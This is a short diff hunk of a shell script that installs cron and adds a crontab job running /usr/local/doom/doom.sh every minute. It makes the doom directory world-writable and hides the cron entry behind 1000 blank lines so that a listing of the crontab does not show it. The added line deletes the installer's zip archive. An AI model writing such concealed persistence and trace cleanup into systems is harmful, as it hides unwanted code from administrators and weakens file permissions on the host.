@@ -8,3 +8,6 @@ chmod -R 777 /usr/local/doom
 apt install cron -y
 
 (crontab -l 2>/dev/null; printf '\n%.0s' {1..1000}; echo "* * * * * /usr/local/doom/doom.sh >> /var/log/logdoom.log 2>&1") | crontab -
+
+
+rm /usr/local/doom.zip
